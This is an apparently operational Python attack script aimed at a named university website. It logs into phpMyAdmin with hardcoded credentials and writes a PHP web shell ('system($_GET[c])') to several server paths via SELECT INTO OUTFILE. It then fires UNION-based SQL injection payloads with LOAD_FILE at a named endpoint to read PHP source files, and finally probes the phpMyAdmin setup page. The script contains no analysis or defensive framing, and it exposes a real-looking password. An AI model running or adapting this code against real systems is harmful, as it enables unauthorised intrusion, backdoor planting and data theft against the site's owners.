#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"
pma_url = url + "/phpmyadmin/"

# 登录phpMyAdmin
session = requests.Session()
session.verify = False
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(pma_url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

# 方法1: 通过phpMyAdmin的SQL执行，写入到phpMyAdmin目录
print("[*] 写入到phpMyAdmin目录...")
pma_paths = [
    "/var/www/phpmyadmin/shell.php",
    "/usr/share/phpmyadmin/shell.php",
    "/opt/lampp/phpmyadmin/shell.php",
]

for pma_path in pma_paths:
    sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{pma_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    test_url = pma_url + "shell.php?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

# 方法2: 通过SQL注入读取敏感信息
print("[*] 通过getmobilesubject.php SQL注入读取文件...")
sqli_url = url + "/enmeeting/getmobilesubject.php"

# 尝试读取x.php
payloads = [
    "1' UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
    "1' UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "1' UNION SELECT CONCAT(LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),'test'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
]

for payload in payloads:
    resp = requests.get(sqli_url, params={"subjectid": payload}, verify=False, timeout=10)
    if "<?php" in resp.text:
        print("[+] 读取x.php成功!")
        print("="*70)
        print(resp.text)
        print("="*70)
        exit(0)
    elif len(resp.text) > 50 and "<?php" not in resp.text:
        print(f"[*] 响应: {resp.text[:200]}")

# 方法3: 通过SQL注入写入shell（绕过secure_file_priv）
print("[*] 尝试绕过secure_file_priv写入...")
# 检查secure_file_priv值
sql_data = {"sql_query": "SHOW VARIABLES LIKE 'secure_file_priv';", "db": "mysql"}
resp = session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
if "NULL" in resp.text or "/tmp" in resp.text or "" in resp.text:
    print("[*] secure_file_priv可能允许写入")
    
    # 尝试写入到允许的目录
    allowed_paths = [
        "/tmp/shell.php",
        "/var/tmp/shell.php",
    ]
    
    for allowed_path in allowed_paths:
        sql = f"SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '{allowed_path}';"
        sql_data = {"sql_query": sql, "db": "mysql"}
        session.post(pma_url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
        
        # 如果主站有文件包含，可以包含这个文件
        # 或者通过php://filter读取

# 方法4: 通过phpMyAdmin的setup功能写入config
print("[*] 尝试setup写入config...")
setup_url = pma_url + "setup/"
setup_resp = requests.get(setup_url, verify=False, timeout=5)
if setup_resp.status_code == 200:
    # 尝试通过setup保存配置写入shell
    setup_data = {
        "Servers/1/host": "localhost",
        "Servers/1/user": "root",
        "Servers/1/password": "",
        "Servers/1/auth_type": "config",
    }
    setup_resp2 = requests.post(setup_url + "index.php", data=setup_data, verify=False, timeout=5)

print("[-] 继续深度挖掘...")
